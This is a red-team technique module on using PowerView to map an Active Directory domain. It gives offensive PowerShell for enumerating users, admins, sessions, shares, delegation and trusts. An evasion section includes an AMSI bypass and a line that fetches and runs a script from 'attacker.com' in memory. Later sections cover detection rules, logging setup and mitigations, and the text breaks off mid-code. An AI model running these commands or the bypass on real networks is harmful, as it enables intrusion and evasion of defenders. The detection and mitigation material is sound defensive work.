# REC-AD-003: PowerView Enumeration for Domain Mapping

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-AD-003 |
| **Technique Name** | PowerView enumeration for domain mapping |
| **MITRE ATT&CK ID** | T1087.002 – Account Discovery: Domain Account |
| **CVE** | N/A (Native PowerShell) |
| **Platform** | Windows Active Directory |
| **Viability Status** | ACTIVE ✓ |
| **Difficulty to Detect** | MEDIUM |
| **Requires Authentication** | Yes (domain credentials) |
| **Applicable Versions** | Windows Server 2012 R2+ (all AD versions) |
| **Last Verified** | December 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

PowerView enumeration is a comprehensive post-compromise reconnaissance technique that leverages a pure-PowerShell implementation of Active Directory queries to systematically map domain structure, identify users, computers, groups, and trust relationships. As a component of the PowerSploit framework, PowerView has become the de facto standard for domain enumeration in red team operations, providing an intuitive interface to query LDAP and Active Directory Web Services (ADWS) without requiring external tools or compiled binaries.

**Threat Profile:** An attacker with valid domain credentials can execute PowerView to:
- Map complete domain structure and naming conventions
- Enumerate all users, groups, and computers
- Identify high-privilege accounts (Domain Admins, Enterprise Admins)
- Discover domain controllers and trust relationships
- Locate currently logged-on users across the domain
- Find shared folders and potentially sensitive files
- Build comprehensive attack graphs (feeds into BloodHound)

**Business Impact:**
- Complete domain topology exposure (enables targeted attacks)
- Identification of high-value targets for privilege escalation
- Discovery of service accounts and delegated permissions
- Mapping of trust relationships across forests (multi-domain attacks)
- Phishing target identification (user enumeration with email addresses)
- Compliance violations (GDPR, DORA, NIS2)

---

## 3. TECHNICAL PREREQUISITES

### Required Knowledge
- Understanding of Active Directory structure and object classes
- Familiarity with PowerShell scripting and pipeline operations
- Knowledge of LDAP/ADSI and Active Directory queries
- Understanding of group nesting and membership relationships
- Domain trust concepts (transitive, non-transitive, forest trusts)

### Required Tools
- **PowerView.ps1** – PowerSploit reconnaissance module
  - Source: https://github.com/PowerShellMafia/PowerSploit
  - File path: PowerSploit/Recon/PowerView.ps1
  - Size: ~700 KB (full PowerView with all functions)
- **PowerShell 3.0+** – Scripting language
  - Default on Windows 7+ and Server 2008 R2+
  - PowerShell 5.0+ (Windows 10+, Server 2016+) recommended
- **Domain Credentials** – Standard or administrative user
  - Standard user sufficient for basic enumeration
  - Administrative credentials required for sensitive operations

### System Requirements
- Windows operating system (10, Server 2012 R2+)
- Active Directory domain membership or Kerberos authentication
- Network access to domain controllers (LDAP ports 389/636, ADWS port 9389)
- No local system access required (executes in user context)

### Cloud/Environment Considerations
- **On-Premises AD:** Full support
- **Hybrid (Azure AD Connect):** Full support with Azure AD reconnaissance extensions
- **Entra ID (Cloud-Only):** PowerView not applicable; see REC-AD-001
- **AD DS in Azure VMs:** Same as on-premises
- **Multi-domain Forests:** Full support across all domains
- **Trust-connected domains:** Full support (may require explicit credentials)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Information Gathering Phase

Before executing PowerView, establish domain context:

1. **Domain Structure Discovery**
   - Identify target domain name (FQDN): company.com
   - Determine forest root domain
   - Identify subsidiary/acquired domains
   - Locate domain controllers (DNS lookup: `nslookup -type=SRV _ldap._tcp.dc._msdcs.company.com`)

2. **Authentication Preparation**
   - Obtain or compromise domain credentials
   - Identify authentication method (Kerberos vs. NTLM)
   - Determine if multi-domain trusts exist
   - Check for resource-based constrained delegation opportunities

3. **Network Access Validation**
   - Verify LDAP port access (389 or 636 for LDAPS)
   - Test ADWS connectivity (port 9389, if available)
   - Confirm DNS resolution of domain controllers
   - Check for network segmentation/firewall rules

### Risk Assessment Before Execution

- **Operational Risk:** Low (read-only queries, no persistence changes)
- **Detection Risk:** Medium-to-High (PowerShell Script Block Logging detects execution)
- **Noise/Forensic Risk:** High (many AD queries may trigger alerting)
- **Attribution Risk:** High (activity traceable to user account/source IP)

---

## 5. DETAILED EXECUTION

### Method 1: Basic Domain Enumeration (Minimal Noise)

**Objective:** Extract fundamental domain information with minimal detection footprint.

```powershell
# Step 1: Import PowerView (from current directory or module path)
Import-Module .\PowerView.ps1 -Force

# Step 2: Confirm module is loaded
Get-Command -Module Recon | Where-Object {$_ -like "*NetDomain*"}

# Step 3: Get basic domain information
Get-NetDomain

# Expected Output:
# DomainName: company.com
# ForestName: company.com
# DomainControllers: {dc01.company.com, dc02.company.com}
# RidRoleOwner: dc01.company.com (RID master)
# PdcRoleOwner: dc02.company.com (PDC emulator)
# DomainSID: S-1-5-21-3623811015-3361044348-30300820
# ChildDomains: {subsidiary.company.com}
# ParentDomain: (none - root domain)
```

**Data Extracted:**
- Primary domain name and FQDN
- Forest topology (parent/child relationships)
- Domain controller hostnames and roles (RID, PDC, Infrastructure Master)
- Domain SID (required for privilege escalation planning)
- Child domains in forest

---

### Method 2: User Enumeration (High Value)

**Objective:** Extract complete user account list with properties for targeting.

```powershell
# List all domain users
Get-NetUser

# Or more targeted:
Get-NetUser -Domain company.com | Select-Object samaccountname, displayname, mail, useraccountcontrol | Where-Object {$_.useraccountcontrol -ne 2}  # Exclude disabled users

# Expected Output:
# samaccountname      displayname           mail                      useraccountcontrol
# Administrator       Administrator Account administrator@company.com  0 (enabled)
# guest               Guest Account                                    66048 (disabled)
# john.smith          John Smith            john.smith@company.com     0 (enabled)
# jane.doe            Jane Doe              jane.doe@company.com       0 (enabled)
# db_service          DB Service Account    db_service@company.com     512 (enabled)
# web_admin           Web Admin             web_admin@company.com      0 (enabled)

# Get full attributes for specific user
Get-NetUser -UserName "john.smith" -FullData

# Expected Output includes: lastLogon, pwdLastSet, accountExpires, description, groups, SPNs, etc.

# Search for users by pattern (e.g., service accounts)
Get-NetUser -UserName "*svc*" | Select-Object samaccountname

# Get password policy to inform brute force strategy
(Get-DomainPolicy)."SystemAccess"
# maxPwdAge: 42 (days)
# minPwdAge: 1 (day)
# minPwdLength: 8
# pwdHistoryLength: 24
# lockoutDuration: 30 (minutes)
# lockoutThreshold: 0 (lockout disabled) <-- HIGH RISK
```

**High-Value Data Extracted:**
- Complete user account list (targeting for phishing)
- Email addresses (for social engineering)
- Service accounts (for credential theft/kerberoasting)
- Disabled/inactive accounts (indicates old infrastructure)
- Password policy (informs brute force/spray strategy)

---

### Method 3: Privileged Account Discovery

**Objective:** Identify high-value targets (Domain Admins, Enterprise Admins, etc.).

```powershell
# Get Domain Admins
Get-NetGroupMember -GroupName "Domain Admins"

# Expected Output:
# MemberName              ObjectClass  Domain
# CN=Administrator,...    user         company.com
# CN=John Smith,...       user         company.com

# List all high-privilege groups
Get-NetGroup -GroupName "*admin*" | Select-Object samaccountname

# Expected Output:
# samaccountname
# Administrators
# Domain Admins
# Enterprise Admins
# Schema Admins
# Group Policy Creator Owners
# DnsAdmins

# Get members of each privileged group (recursive)
Get-NetGroupMember -GroupName "Domain Admins" -Recurse

# Get members of local Administrators on all domain computers (VERY NOISY)
Invoke-EnumerateLocalAdmin  # Requires RCP/SMB access, high detection risk

# Identify accounts with administrative rights (via adminCount flag)
Get-NetUser | Where-Object {$_.adminCount -eq 1}

# Get users with Service Principal Names (Kerberoastable accounts)
Get-NetUser -LDAPFilter "(serviceprincipalname=*)"
```

**High-Value Intelligence:**
- Domain Admins members (primary attack targets)
- Enterprise Admins in multi-domain environments
- Schema Admins (infrastructure attacks)
- DnsAdmins (privilege escalation path)
- Service accounts with SPNs (kerberoasting targets)

---

### Method 4: Computer Enumeration and Network Mapping

**Objective:** Identify domain-joined systems and potential lateral movement targets.

```powershell
# List all domain computers
Get-NetComputer | Select-Object dnsHostName, operatingSystem, lastLogonTimestamp

# Expected Output:
# dnsHostName              operatingSystem                        lastLogonTimestamp
# dc01.company.com         Windows Server 2019 Standard Evaluation  1/15/2025 10:30:00 AM
# ws01.company.com         Windows 10 Enterprise                  1/20/2025 02:15:00 AM
# sql01.company.com        Windows Server 2016 Standard            1/22/2025 11:45:00 AM
# ex01.company.com         Windows Server 2019 Datacenter          1/21/2025 09:30:00 AM
# file01.company.com       Windows Server 2016 Standard            1/22/2025 05:20:00 AM

# Filter by operating system (identify outdated systems)
Get-NetComputer -OperatingSystem "Windows Server 2012*" | Select-Object dnsHostName, operatingSystem

# Filter for servers only
Get-NetComputer -OperatingSystem "*Server*" | Select-Object dnsHostName

# Check which computers can be pinged (alive)
Get-NetComputer -Ping | Select-Object dnsHostName

# Get computers with RDP service enabled (lateral movement targets)
Get-NetComputer | Where-Object {$_.lastLogonTimestamp -gt (Get-Date).AddDays(-7)} | Select-Object dnsHostName, operatingSystem
```

**Lateral Movement Intelligence:**
- List of accessible systems (for credential deployment)
- Outdated OS versions (known vulnerabilities)
- Service infrastructure (SQL, Exchange, SharePoint)
- Active vs. inactive hosts
- High-value targets (user workstations with recent activity)

---

### Method 5: Organizational Unit and Group Policy Enumeration

**Objective:** Map domain organizational structure and identify group policy-based control flows.

```powershell
# Enumerate all organizational units
Get-NetOU | Select-Object distinguishedname, name

# Expected Output:
# distinguishedname                              name
# OU=Domain Controllers,DC=company,DC=com       Domain Controllers
# OU=Users,DC=company,DC=com                    Users
# OU=Computers,DC=company,DC=com                Computers
# OU=Finance,OU=Users,DC=company,DC=com         Finance
# OU=Engineering,OU=Users,DC=company,DC=com     Engineering
# OU=Sales,OU=Users,DC=company,DC=com           Sales

# Get all groups in domain with type
Get-NetGroup | Select-Object samaccountname, groupScope, groupCategory

# Expected Output:
# samaccountname                   groupScope  groupCategory
# Domain Admins                    Global      Security
# Finance Department               Universal   Security
# Engineering Team                 Universal   Security
# HelpDesk                         Global      Security
# Distribution Lists               Global      Distribution

# Find which groups have admin rights on systems (via GPO)
Find-GPOComputerAdmin | Select-Object objectname

# Retrieve default domain security policy
(Get-DomainPolicy)."SystemAccess" | Format-Table
```

**Infrastructure Intelligence:**
- Domain organizational structure
- Group membership hierarchies
- Administrative scope via group policy
- Infrastructure trust and delegation paths

---

### Method 6: User Hunting and Session Discovery

**Objective:** Locate where high-value users are currently logged in.

```powershell
# Find which computers a specific user is logged into
Invoke-UserHunter -UserName "john.smith"

# Expected Output:
# ComputerName         IPAddress      SessionType  AccountName
# ws01.company.com     10.0.1.50      Interactive  COMPANY\john.smith
# sql01.company.com    10.0.2.75      Interactive  COMPANY\john.smith

# Find all current user sessions across domain (requires admin rights)
Invoke-UserHunter -ShowAll

# Stealthier variant: hunt via file servers only (less noisy)
Invoke-StealthUserHunter -UserName "john.smith"

# Get RDP sessions (if RDP service accessible)
Get-NetRDPSession -ComputerName "ws01.company.com"

# Expected Output:
# SessionName   UserName  SessionID  SessionState  IdleTime
# rdp-tcp#1     john.smith    1      Active        5 minutes

# Get users currently logged on to specific machine
Get-NetLoggedon -ComputerName "dc01.company.com"

# Expected Output:
# UserName                     LogonType
# COMPANY\Administrator        10 (Batch)
# COMPANY\john.smith           2 (Interactive)
# COMPANY\SYSTEM               5 (Service)
```

**Session Intelligence:**
- Which users can be compromised (currently active sessions)
- Where high-privilege users are logged in (Domain Admins on workstations)
- Interactive vs. service account sessions
- Timing for credential harvesting (LSAss dumping)

---

### Method 7: Trust Relationship Enumeration

**Objective:** Map forest and domain trust relationships for multi-domain attacks.

```powershell
# Enumerate domain trusts
Get-NetDomainTrust

# Expected Output:
# SourceName           TargetName              TrustType        TrustDirection
# company.com          subsidiary.com          ParentChild      Bidirectional
# company.com          partner.com             External         Bidirectional
# company.com          forest2.com             Forest           Bidirectional

# Enumerate forest trusts
Get-NetForestTrust

# Map all trusts (including nested domains)
Invoke-MapDomainTrust | Out-GridView

# Get all domains in forest
Get-NetForestDomain | Select-Object Name, Forest

# Expected Output:
# Name             Forest
# company.com      company.com (root)
# subsidiary.com   company.com
# partner.com      company.com (external trust)

# Check for SID filtering (trust vulnerability)
# SID filtering present = safe, SID filtering disabled = exploitation possible
```

**Multi-Domain Attack Intelligence:**
- Forest structure and domain relationships
- Trust direction (one-way vs. bidirectional)
- External trust targets (potentially weaker security)
- SID filtering status (domain trust elevation paths)
- Child domains with potential escalation paths

---

### Method 8: Share and File Discovery

**Objective:** Locate network shares and potentially sensitive files.

```powershell
# Find non-standard shares across all domain computers
Invoke-ShareFinder

# Expected Output:
# ComputerName  ShareName         Path                              ShareType
# file01        C$                C$                                STYPE_DISKTREE
# file01        ADMIN$            C:\Windows                        STYPE_DISKTREE
# file01        IPC$              IPC$                              STYPE_IPCSHARE
# file01        Backups           C:\Backups                        STYPE_DISKTREE
# file01        Development       C:\Development                    STYPE_DISKTREE
# db01          SQLBackup         D:\SQLBackup                      STYPE_DISKTREE

# Find sensitive files on shares
Invoke-FileFinder -SharePath "\\file01\Backups" -Terms "password", "backup", "key"

# Get share information on specific computer
Get-NetShare -ComputerName "file01.company.com"

# List sessions on file server (who's connected)
Get-NetSession -ComputerName "file01.company.com"

# Expected Output:
# UserName          ComputerName      IDleTime
# COMPANY\john.smith 10.0.1.50        2 hours
# COMPANY\jane.doe  10.0.2.100        45 minutes
```

**Data Exfiltration Intelligence:**
- High-value share locations (Backups, Development)
- Potential credential storage (password files, config files)
- Active sessions (indicates which users access data)

---

### Method 9: Constrained/Unconstrained Delegation Discovery

**Objective:** Identify privilege escalation paths via delegation abuse.

```powershell
# Get computers with unconstrained delegation (dangerous)
Get-NetComputer -Unconstrained | Select-Object dnsHostName

# Expected Output:
# dnsHostName
# dc01.company.com
# ex01.company.com (Exchange)

# Get computers with constrained delegation (safer but exploitable)
Get-NetComputer -TrustedToAuth | Select-Object dnsHostName, msDS-AllowedToDelegateTo

# Get users with delegation rights
Get-NetUser -AllowDelegation | Select-Object samaccountname

# Get accounts with service principal names (Kerberoastable)
Get-NetUser -LDAPFilter "(serviceprincipalname=*)" | Select-Object samaccountname, serviceprincipalname

# Expected Output:
# samaccountname    serviceprincipalname
# mssql_svc         MSSQLSvc/sql01.company.com
# mssql_svc         MSSQLSvc/sql01.company.com:1433
# exchange          krbtgt/company.com
# ex01$             exchangeMDB/ex01.company.com
```

**Privilege Escalation Paths:**
- Unconstrained delegation targets (token impersonation attacks)
- Constrained delegation chains (service account compromise → admin)
- Service accounts (kerberoasting for password cracking)

---

### Method 10: Evasion-Aware Execution (OPSEC)

**Objective:** Execute PowerView with detection evasion techniques.

```powershell
# Method A: AMSI Bypass + Obfuscated Loading
# (Prior to PowerView import)
$amsiBypass = @"
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
"@
Invoke-Expression $amsiBypass

# Method B: Load PowerView from memory (avoid disk artifacts)
$url = "https://attacker.com/PowerView.ps1"
Invoke-WebRequest -Uri $url -UseBasicParsing | Invoke-Expression

# Method C: Obfuscate cmdlet names
$GetNetUser = (Get-Command Get-NetUser).Definition
Invoke-Expression $GetNetUser
$GetNetUser | Invoke-Expression  # Execute via pipeline

# Method D: Stagger queries (avoid bulk enumeration detection)
Get-NetUser | ForEach-Object {
    Write-Output "$($_.samaccountname),$($_.mail)"
    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)  # Random delays
}

# Method E: Filter output to reduce noise in logs
Get-NetUser -LDAPFilter "(serviceprincipalname=*)" -SearchBase "OU=Service Accounts,DC=company,DC=com" | Select-Object samaccountname
# Only enumerate specific OUs, specific object types

# Method F: Use alternate credentials (blend with legitimate traffic)
$cred = New-Object System.Management.Automation.PSCredential("COMPANY\serviceaccount", (ConvertTo-SecureString "Password123" -AsPlainText -Force))
Get-NetUser -Credential $cred -Domain company.com
```

**Detection Evasion Techniques:**
- AMSI bypass (AmsiInitFailed injection)
- In-memory script execution (avoids PowerView.ps1 on disk)
- Cmdlet name obfuscation
- Query staggering (defeats bulk enumeration detection)
- Filtering by OU/searchbase (targeted queries)
- Alternate credentials (misattribution)

---

## 6. TOOLS & COMMANDS REFERENCE

### PowerView Core Functions Matrix

| Function | Purpose | Output | Detection Risk |
|----------|---------|--------|-----------------|
| **Get-NetDomain** | Domain metadata | Forest, DCs, SID | Low |
| **Get-NetForest** | Forest topology | Child domains, root | Low |
| **Get-NetUser** | User enumeration | All users, properties | High |
| **Get-NetComputer** | Computer enumeration | All computers, OS | High |
| **Get-NetGroup** | Group enumeration | All groups, members | High |
| **Get-NetGroupMember** | Group members | Members, recurse | Very High |
| **Invoke-UserHunter** | User sessions | User locations | Very High |
| **Get-NetDomainTrust** | Trust relationships | Trust chain | Low |
| **Invoke-ShareFinder** | Network shares | Share paths, access | Very High |
| **Get-NetRDPSession** | RDP sessions | Active RDP users | High |

### Essential PowerView Commands (Copy/Paste Ready)

```powershell
# Load PowerView
Import-Module .\PowerView.ps1 -Force

# Quick domain snapshot
@{
    Domain = (Get-NetDomain).name
    Forest = (Get-NetForest).name
    DCs = (Get-NetDomainController).hostname
    UserCount = (Get-NetUser).Count
    ComputerCount = (Get-NetComputer).Count
    AdminCount = (Get-NetGroupMember -GroupName "Domain Admins").Count
}

# High-value targets
@{
    DomainAdmins = Get-NetGroupMember -GroupName "Domain Admins" | Select-Object -ExpandProperty MemberName
    Kerberoastable = Get-NetUser -LDAPFilter "(serviceprincipalname=*)" | Select-Object samaccountname
    Unconstrained = Get-NetComputer -Unconstrained | Select-Object dnsHostName
    HighPrivUsers = Get-NetUser | Where-Object {$_.adminCount -eq 1} | Select-Object samaccountname
}

# Data extraction (export to CSV)
Get-NetUser | Select-Object samaccountname, mail, lastLogonTimestamp | Export-Csv -Path "C:\Users\output.csv"
Get-NetComputer | Select-Object dnsHostName, operatingSystem | Export-Csv -Path "C:\Computers.csv"
Get-NetGroupMember -GroupName "Domain Admins" | Export-Csv -Path "C:\DomainAdmins.csv"
```

---

## 7. ATOMIC TESTS (RED TEAM VALIDATION)

### Test 1: PowerView Module Import

**Objective:** Verify PowerView loads without errors.

**Procedure:**
```powershell
$ErrorActionPreference = "Stop"
try {
    Import-Module .\PowerView.ps1 -Force -Verbose
    Get-Command -Module Recon | Measure-Object
    Write-Output "✓ Test PASSED: PowerView module loaded successfully"
}
catch {
    Write-Output "✗ Test FAILED: $($_.Exception.Message)"
}
```

**Success Criteria:** Module loads without errors; 100+ cmdlets available.

### Test 2: Basic Domain Enumeration

**Objective:** Verify ability to query domain metadata.

**Procedure:**
```powershell
$domain = Get-NetDomain
if ($domain -and $domain.name -match "^[a-z0-9-\.]+\.[a-z]{2,}$") {
    Write-Output "✓ Test PASSED: Domain discovered - $($domain.name)"
} else {
    Write-Output "✗ Test FAILED: Invalid domain format"
}
```

**Success Criteria:** Returns valid domain name in FQDN format.

### Test 3: User Enumeration

**Objective:** Verify ability to enumerate domain users.

**Procedure:**
```powershell
$users = @(Get-NetUser)
if ($users.Count -gt 0) {
    Write-Output "✓ Test PASSED: Found $($users.Count) users"
    Write-Output "  Sample: $($users[0].samaccountname)"
} else {
    Write-Output "✗ Test FAILED: No users enumerated"
}
```

**Success Criteria:** Returns count > 3 (minimum: Administrator, Guest, krbtgt).

### Test 4: Privileged Account Detection

**Objective:** Verify identification of Domain Admins.

**Procedure:**
```powershell
$admins = Get-NetGroupMember -GroupName "Domain Admins"
if ($admins.Count -gt 0) {
    Write-Output "✓ Test PASSED: Found $($admins.Count) Domain Admins"
    $admins | ForEach-Object { Write-Output "  - $($_.MemberName)" }
} else {
    Write-Output "✗ Test FAILED: No Domain Admins found"
}
```

**Success Criteria:** Returns 1+ members of Domain Admins group.

### Test 5: Trust Relationship Detection

**Objective:** Verify enumeration of domain trusts.

**Procedure:**
```powershell
$trusts = Get-NetDomainTrust
Write-Output "✓ Test PASSED: Found $($trusts.Count) trust relationships"
if ($trusts.Count -gt 0) {
    $trusts | ForEach-Object { Write-Output "  $($_.SourceName) -> $($_.TargetName) ($($_.TrustType))" }
}
```

**Success Criteria:** Returns 0+ trusts (0 is valid for single domain).

---

## 8. MICROSOFT SENTINEL DETECTION

### Detection Rule 1: PowerView Reconnaissance Command Execution

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 4104 - PowerShell Script Block Logging)
- **Alert Severity:** High
- **Frequency:** Real-time (every 5 minutes)
- **Applies To:** All Windows 10+, Server 2016+ systems

**KQL Query:**
```kusto
let timerange = 1h;
let PowerViewCommands = dynamic([
    "Get-NetUser",
    "Get-NetComputer", 
    "Get-NetGroup",
    "Get-NetGroupMember",
    "Get-NetDomain",
    "Get-NetForest",
    "Invoke-UserHunter",
    "Invoke-ShareFinder",
    "Get-NetDomainTrust",
    "Get-DomainPolicy",
    "Get-NetLoggedon",
    "Get-NetSession"
]);

SecurityEvent
| where TimeGenerated > ago(timerange)
| where EventID == 4104  // PowerShell Script Block Logging
| extend ScriptBlockText = EventData.ScriptBlockText
| where ScriptBlockText in (PowerViewCommands) or 
        ScriptBlockText has_any (PowerViewCommands) or
        ScriptBlockText contains "Get-Domain"
| summarize
    CommandCount = count(),
    UniqueCommands = dcount(ScriptBlockText),
    FirstExecution = min(TimeGenerated),
    LastExecution = max(TimeGenerated)
    by Computer, User, ScriptBlockText
| where CommandCount > 3  // Threshold: multiple reconnaissance queries
| extend AlertSeverity = "High", TechniqueID = "T1087.002"
```

**What This Detects:**
- Execution of PowerView cmdlets via Script Block Logging
- Multiple enumeration queries from single user/computer
- Domain Admin discovery attempts
- User hunting commands (Invoke-UserHunter)
- Share enumeration (Invoke-ShareFinder)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `PowerView Reconnaissance Command Execution`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group alerts: **By Alert name and User**
7. Click **Review + create**

---

### Detection Rule 2: Domain Group Member Enumeration (T1087.002)

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 4104)
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To:** All systems

**KQL Query:**
```kusto
let timerange = 1h;
let AdminGroups = dynamic(["Domain Admins", "Enterprise Admins", "Schema Admins", "DnsAdmins"]);

SecurityEvent
| where TimeGenerated > ago(timerange)
| where EventID == 4104
| extend ScriptBlockText = EventData.ScriptBlockText
| where ScriptBlockText contains "Get-DomainGroupMember" or ScriptBlockText contains "Get-NetGroupMember"
| where ScriptBlockText has_any (AdminGroups)
| summarize
    QueryCount = count(),
    TargetGroups = make_set(ScriptBlockText),
    FirstQuery = min(TimeGenerated),
    LastQuery = max(TimeGenerated)
    by Computer, User
| where QueryCount > 1
| extend AlertSeverity = "High", TechniqueID = "T1087.002"
```

**What This Detects:**
- Queries targeting high-privilege group members
- Reconnaissance focused on administrative accounts
- Potential precursor to privilege escalation

---

## 9. WINDOWS EVENT LOG MONITORING

### Event ID: 4104 (PowerShell Script Block Logging)

**Log Source:** Microsoft-Windows-PowerShell/Operational

**Trigger:** PowerShell script block execution (when enabled)

**Configuration Steps (Enable Logging):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows PowerShell**
3. Double-click **Turn on PowerShell Script Block Logging**
4. Select **Enabled**
5. Click **OK**
6. Run `gpupdate /force` on target machines

```powershell
# PowerShell equivalent:
$RegPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $RegPath -Force | Out-Null
Set-ItemProperty -Path $RegPath -Name "EnableScriptBlockLogging" -Value 1

# Verify:
Get-ItemProperty -Path $RegPath
```

**Event 4104 Data Fields:**
- **ScriptBlockText:** PowerView command executed
- **MessageNumber:** Sequence in multi-block scripts
- **Path:** Script source (file path or memory)
- **HostName:** Source host executing PowerShell

**Detection Tuning:**
```powershell
# Search for PowerView-specific commands
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104]]" | 
  Where-Object {$_.Properties[2].Value -match "Get-NetUser|Get-NetGroup|Invoke-UserHunter"}
```

### Event ID: 4103 (PowerShell Module Logging)

**Log Source:** Microsoft-Windows-PowerShell/Operational

**Configuration Steps:**
1. **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows PowerShell**
3. Double-click **Turn on Module Logging**
4. Select **Enabled**
5. Add specific modules (or leave blank for all): `Active Directory`, `Microsoft.PowerShell.Management`
6. Click **OK**

```powershell
# PowerShell equivalent:
$RegPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
New-Item -Path $RegPath -Force | Out-Null
Set-ItemProperty -Path $RegPath -Name "EnableModuleLogging" -Value 1

# Add modules to monitor (optional)
New-ItemProperty -Path "$RegPath\ModuleNames" -Name "*" -Value "*" -Force
```

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows 10+, Server 2016+

**Sysmon Config Snippet** (for detecting PowerView execution):

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Capture PowerView script block loading -->
    <CreateRemoteThread onmatch="include">
      <TargetImage condition="contains">powershell</TargetImage>
      <SourceImage condition="contains">powershell</SourceImage>
    </CreateRemoteThread>
    
    <!-- Capture PowerShell process with script execution -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">powershell</CommandLine>
      <CommandLine condition="contains" substitution="none">Get-Net</CommandLine>
      <CommandLine condition="contains" substitution="none">Get-Domain</CommandLine>
      <CommandLine condition="contains" substitution="none">Invoke-User</CommandLine>
    </ProcessCreate>
    
    <!-- Capture LDAP queries from PowerShell -->
    <NetworkConnect onmatch="include">
      <InitiatingProcessName condition="contains">powershell</InitiatingProcessName>
      <DestinationPort condition="is">389</DestinationPort>
      <DestinationPort condition="is">636</DestinationPort>
      <DestinationPort condition="is">9389</DestinationPort>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create configuration file with XML above
3. Install Sysmon with config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[EventData[Data[@Name='CommandLine'] and contains(Data,'Get-Net')]]" | Format-Table TimeCreated, Message
   ```

---

## 11. MICROSOFT DEFENDER FOR IDENTITY

### Detection Alert: Reconnaissance Activities via PowerView

**Alert Name:** "Reconnaissance activities detected via PowerView enumeration"
- **Severity:** High
- **Description:** Detects PowerView cmdlet execution indicative of domain reconnaissance activities
- **Applies To:** All domains with Microsoft Defender for Identity enabled
- **Source:** SecurityEvent table (PowerShell logging)

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your domain
3. Under **Defender for Identity**, enable **PowerShell audit logging**
4. Set **Audit level** to **Informational**
5. Wait 24 hours for baseline collection
6. Go to **Advanced Hunting** → Create query for PowerView detection

**Advanced Hunting Query:**
```kusto
SecurityEvent
| where EventID == 4104
| extend ScriptBlockText = EventData.ScriptBlockText
| where ScriptBlockText has_any ("Get-NetUser", "Get-NetGroup", "Get-NetComputer", "Invoke-UserHunter", "Get-NetDomainTrust")
| summarize ReconCount = count() by Computer, User, min(TimeGenerated)
| where ReconCount > 3
```

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Note:** Microsoft Purview does not directly log PowerView execution. Instead, utilize Windows Event Forwarding:

### Query: PowerView Activity Collection

```powershell
# Configure Windows Event Forwarding to central collector
# On target systems:
winrm quickconfig -q

# On collector:
wecutil cs "PowerView Forwarding"

# Then query in Sentinel:
SecurityEvent
| where EventID == 4104
| where EventData contains "Get-Net" or EventData contains "Get-Domain"
| project TimeGenerated, Computer, User, EventData
```

---

## 13. FALSE POSITIVE ANALYSIS

### Legitimate Activity That Mimics PowerView

| Activity | Appears As | Legitimate Reason | How to Distinguish |
|----------|-----------|------------------|-------------------|
| Legitimate admin discovery | Get-NetUser, Get-NetGroup | Helpdesk/admin tasks | Interactive sessions during business hours; low frequency |
| Azure AD Connect sync | LDAP queries to DC | Identity sync | Service account context; scheduled pattern |
| Monitoring/alerting tools | User enumeration | Security monitoring | Whitelisted tool accounts; predictable patterns |
| Active Directory reporting | Group member queries | Compliance/audit | Scheduled jobs; expected reporting accounts |
| Identity governance | Permission discovery | Access reviews | Scheduled automation; known tools |

**Tuning Recommendations:**
```kusto
// Exclude known legitimate sources
let WhitelistedUsers = dynamic(["SYSTEM", "svc_ADConnect", "svc_monitoring"]);
let WhitelistedComputers = dynamic(["DC01", "MONITOR01", "AUDIT01"]);

SecurityEvent
| where EventID == 4104
| extend ScriptBlockText = EventData.ScriptBlockText
| where ScriptBlockText has_any ("Get-Net", "Get-Domain")
| where !User in (WhitelistedUsers)
| where !Computer in (WhitelistedComputers)
| where ScriptBlockText contains "Get-NetUser" or ScriptBlockText contains "Get-NetGroupMember"
// ... rest of detection logic
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Enable PowerShell Script Block Logging (All Versions)**
  - **Applies To:** Windows 10+, Server 2016+
  
  **Manual Steps (Group Policy):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows PowerShell**
  3. Double-click **Turn on PowerShell Script Block Logging**
  4. Select **Enabled**
  5. Click **OK**
  6. Run `gpupdate /force`
  
  **Manual Steps (PowerShell):**
  ```powershell
  $RegPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
